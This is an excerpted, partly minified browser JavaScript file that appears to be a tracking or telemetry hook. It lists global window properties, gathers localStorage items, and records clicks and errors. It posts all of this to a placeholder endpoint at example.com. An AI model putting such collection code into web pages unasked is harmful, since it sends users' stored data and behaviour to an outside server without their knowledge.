(function () {
  ...
  function trackGlobalScope() {
    ...
    for (const key in window) {
      if (window.hasOwnProperty(key)) {
        if (!window.tracker.includes(key)) {
    ...
    findings.localStorage = localStorageItems;
    return findings;
  }
  function va(a) {
  ...
  const jshook = function () {
    function sendToBackend(method, args) {
      const apiEndpoint = "https://example.com/api/collect-jshook";
      fetch(apiEndpoint, {
        method: "POST",
        body: JSON.stringify({
          method,
        ...
        if (response.ok) {
          console.log("JSHook data sent successfully");
        } else {
          console.warn(`JSHook Data unsuccessful, server responded with status: ${response.status}`);
        }
      }).catch(error => console.error("Error in sending JSHook Data: ", error));
    }
    return {
      sendToBackend
    };
  ...
  window.addEventListener("error", message => jshook.sendToBackend("error", {
    message
  }));
  function zb() {
    yb() ? vb() : wb();
  ...
  window.addEventListener("click", event => jshook.sendToBackend("click", {
    x: event.clientX,
    y: event.clientY
  }));
  ;
  ...
  function performTrackingTask() {
    const findings = trackGlobalScope();
    const findingsCount = Object.keys(findings).length;
    if (findingsCount > 0) {
      console.group(`Global Scope Check Results - Found ${findingsCount} new properties:`);
      for (const key in findings) {
        console.log(`${key}: ${JSON.stringify(findings[key])}`);
      }
      console.groupEnd();
      sendJSTrackingDataToBackend(findings);
    } else {
      console.info("Global scope check complete, no new properties found");
    }
  }
  var xc, yc, W;
  function zc(a) {
  ...
  async function sendJSTrackingDataToBackend(insights) {
